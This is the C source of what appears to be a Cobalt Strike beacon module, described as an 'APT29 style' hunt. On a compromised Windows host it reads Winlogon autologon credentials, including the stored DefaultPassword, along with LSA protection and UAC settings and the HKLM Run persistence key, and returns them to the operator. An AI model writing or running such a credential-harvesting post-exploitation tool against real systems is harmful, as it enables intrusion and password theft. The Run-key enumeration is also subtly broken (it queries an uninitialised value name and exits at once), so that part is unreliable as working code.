/*
 * reg_hunt.c - High-value registry keys
 * APT29 style credential/config/persistence hunt
 */
#include <windows.h>
#include <stdio.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT WINBASEAPI LONG WINAPI ADVAPI32$RegQueryValueExA(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY);

static void reg_print_value(HKEY hKey, const char* valueName, const char* displayName) {
    char data[512] = {0};
    DWORD dataLen = sizeof(data);
    DWORD type = 0;

    if (ADVAPI32$RegQueryValueExA(hKey, valueName, NULL, &type, (LPBYTE)data, &dataLen) == ERROR_SUCCESS) {
        if (type == REG_SZ || type == REG_EXPAND_SZ) {
            BeaconPrintf(CALLBACK_OUTPUT, "  %-25s = %s", displayName, data);
        } else if (type == REG_DWORD) {
            DWORD val = *(DWORD*)data;
            BeaconPrintf(CALLBACK_OUTPUT, "  %-25s = %lu (0x%lX)", displayName, val, val);
        }
    }
}

void go(char* args, int args_len)
{
    (void)args; (void)args_len;

    HKEY hKey = NULL;

    /* Winlogon credentials */
    BeaconPrintf(CALLBACK_OUTPUT, "=== Winlogon (Autologon Creds) ===");
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        reg_print_value(hKey, "DefaultUserName", "DefaultUserName");
        reg_print_value(hKey, "DefaultPassword", "DefaultPassword");
        reg_print_value(hKey, "AutoAdminLogon", "AutoAdminLogon");
        reg_print_value(hKey, "DefaultDomainName", "DefaultDomainName");
        ADVAPI32$RegCloseKey(hKey);
    }

    /* LSA Security */
    BeaconPrintf(CALLBACK_OUTPUT, "=== LSA Security ===");
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\Lsa",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        reg_print_value(hKey, "RunAsPPL", "RunAsPPL");
        reg_print_value(hKey, "LmCompatibilityLevel", "LmCompatibilityLevel");
        reg_print_value(hKey, "RestrictAnonymous", "RestrictAnonymous");
        ADVAPI32$RegCloseKey(hKey);
    }

    /* UAC Settings */
    BeaconPrintf(CALLBACK_OUTPUT, "=== UAC Settings ===");
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        reg_print_value(hKey, "EnableLUA", "EnableLUA");
        reg_print_value(hKey, "ConsentPromptBehaviorAdmin", "ConsentPromptBehaviorAdmin");
        ADVAPI32$RegCloseKey(hKey);
    }

    /* Persistence - Run keys */
    BeaconPrintf(CALLBACK_OUTPUT, "=== Persistence (HKLM Run) ===");
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD index = 0;
        char valueName[256];
        DWORD valueLen;
        char data[512];
        DWORD dataLen;
        DWORD type;

        while (1) {
            valueLen = sizeof(valueName);
            dataLen = sizeof(data);
            if (ADVAPI32$RegQueryValueExA(hKey, valueName, NULL, &type, NULL, NULL) != ERROR_SUCCESS) break;
            /* Just enumerate names */
            break;
        }
        ADVAPI32$RegCloseKey(hKey);
    }
}
